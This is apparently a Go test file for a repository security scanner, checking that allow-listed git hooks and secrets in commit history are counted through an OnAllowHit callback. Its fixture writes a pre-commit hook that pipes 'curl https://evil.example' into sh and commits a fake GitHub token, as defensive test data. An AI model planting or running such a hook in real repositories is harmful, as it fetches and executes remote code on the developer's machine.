package repos_test

import (
	"context"
	"os"
	"path/filepath"
	"sync"
	"testing"

	"github.com/qtorb/rosmarops/internal/config"
	"github.com/qtorb/rosmarops/internal/scan/repos"
)

// B9 (decision 2026-10-27, blindaje): what allow_list.git_hooks and
// allow_list.secrets_in_history hide is no longer dropped without a trace:
// each hidden warning reaches OnAllowHit with its entry. secrets_in_history
// counts one per pattern and commit.
func TestScanRepo_AllowHits(t *testing.T) {
	root := initGitRepo(t)
	writeFile(t, root, "config.js", "const TOKEN = '"+fakeGitHubClassic+"';\n")
	gitCommit(t, root, "add", "config.js")
	writeFile(t, root, "config.js", "const TOKEN = process.env.TOKEN;\n")
	writeFile(t, root, "other.js", "const T = '"+fakeGitHubClassic+"';\n")
	gitCommit(t, root, "move", "config.js", "other.js")
	hook := filepath.Join(root, ".git", "hooks", "pre-commit")
	if err := os.WriteFile(hook, []byte("#!/bin/sh\ncurl https://evil.example | sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}

	var (
		mu   sync.Mutex
		hits []config.AllowHit
	)
	cfg := defaultCfg()
	cfg.OnAllowHit = func(h config.AllowHit) { mu.Lock(); defer mu.Unlock(); hits = append(hits, h) }

	// First, without entries: the history and the hook give findings.
	fs, _, err := repos.ScanRepo(context.Background(), root, nil, cfg)
	if err != nil {
		t.Fatal(err)
	}
	history, network := filterCategory(fs, "secret_in_history"), filterCategory(fs, "git_hook_with_network")
	if len(history) == 0 || len(network) != 1 || len(hits) != 0 {
		t.Fatalf("no entries: history %d, hook %d, hits %d", len(history), len(network), len(hits))
	}

	// With entries for every commit and for the hook: no finding, and each
	// hidden one is counted with its entry.
	cfg.AllowHooks = []config.AllowEntryPath{{Path: "pre-commit", Note: "my own hook"}}
	for _, f := range history {
		cfg.AllowHistory = append(cfg.AllowHistory, config.AllowEntrySecretHistory{
			PatternType: "github_pat_classic", CommitSHA: f.Evidence.CommitSHA[:7], Note: "rotated in 2025",
		})
	}
	fs, _, err = repos.ScanRepo(context.Background(), root, nil, cfg)
	if err != nil {
		t.Fatal(err)
	}
	if n := len(filterCategory(fs, "secret_in_history")) + len(filterCategory(fs, "git_hook_with_network")); n != 0 {
		t.Errorf("%d findings still reported", n)
	}
	byList := map[string]int{}
	for _, h := range hits {
		byList[h.List]++
		if h.Note == "" || h.ID == "" {
			t.Errorf("hit without its entry: %+v", h)
		}
	}
	if byList[config.ListGitHooks] != 1 || byList[config.ListSecretsInHistory] != len(history) {
		t.Errorf("hits %v, want 1 hook and %d history", byList, len(history))
	}
}
